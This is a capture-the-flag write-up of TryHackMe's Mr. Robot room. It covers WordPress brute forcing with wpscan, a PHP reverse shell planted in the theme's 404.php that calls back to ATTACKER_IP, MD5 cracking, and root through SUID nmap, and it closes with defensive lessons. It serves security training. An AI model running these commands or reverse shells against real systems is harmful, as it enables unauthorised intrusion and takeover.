# 🤖 Mr. Robot CTF

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Mr. Robot CTF](https://tryhackme.com/room/mrrobot) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web, Linux |
| **OS** | Linux |
| **Tools** | nmap, gobuster, wpscan, hydra, john, netcat |

---

## 🎯 Objective

A Mr. Robot themed CTF. Find all three hidden keys on the machine.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
```

**Open ports:**
```
22/tcp  closed  ssh
80/tcp  open    http    Apache
443/tcp open    https   Apache
```

Port 22 is closed — no SSH brute force needed.

---

## 🌐 Web Enumeration

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
```
/robots.txt
/wp-login.php
/wp-admin
/xmlrpc.php
/readme
```

Checking `robots.txt`:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Key 1 found:** `http://TARGET_IP/key-1-of-3.txt`

Downloading the wordlist:
```bash
wget http://TARGET_IP/fsocity.dic
wc -l fsocity.dic
# 858160 lines — deduplicate first
sort -u fsocity.dic > fsocity_unique.dic
```

---

## 💥 Exploitation — WordPress

```bash
# Enumerate WordPress users
wpscan --url http://TARGET_IP --enumerate u

# Brute force login
wpscan --url http://TARGET_IP -U elliot -P fsocity_unique.dic
```

**Credentials found:** `elliot:ER28-0652`

Logging into `/wp-admin` — access to WordPress dashboard confirmed.

**Getting a reverse shell via Theme Editor:**
```
Appearance → Theme Editor → 404.php
```

Replace 404.php content with PHP reverse shell (pentestmonkey):
```php
<?php
set_time_limit (0);
$ip = 'ATTACKER_IP';
$port = 4444;
// ... full reverse shell code
?>
```

Start listener:
```bash
nc -lvnp 4444
```

Trigger by navigating to a non-existent page — shell received as `daemon`.

---

## 🔐 Privilege Escalation

Stabilise shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Found in `/home/robot`:
```bash
ls /home/robot/
# key-2-of-3.txt  password.raw-md5
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack with John:
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: abcdefghijklmnopqrstuvwxyz
```

Switch user:
```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
# Key 2 found
```

**Finding SUID binaries:**
```bash
find / -perm -4000 2>/dev/null
# /usr/local/bin/nmap
```

Nmap has SUID set — using interactive mode for root shell:
```bash
/usr/local/bin/nmap --interactive
nmap> !sh
whoami
# root
cat /root/key-3-of-3.txt
# Key 3 found
```

---

## 🏁 Flags

| Key | Location |
|---|---|
| Key 1 | `/key-1-of-3.txt` — found via robots.txt |
| Key 2 | `/home/robot/key-2-of-3.txt` — after cracking MD5 hash |
| Key 3 | `/root/key-3-of-3.txt` — after SUID nmap privesc |

---

## 📚 Lessons Learned

- `robots.txt` is for search engines — not a security control — always check it
- Deduplicate wordlists before brute forcing — saves significant time
- WordPress Theme Editor is a classic foothold — restrict file editing in production (`define('DISALLOW_FILE_EDIT', true)`)
- SUID on `nmap` (old versions with `--interactive`) allows trivial root — audit SUID binaries regularly
- MD5 is not a password hashing algorithm — use bcrypt, scrypt, or Argon2

---
*by OwlRC 🦉 | github.com/OwlRC*
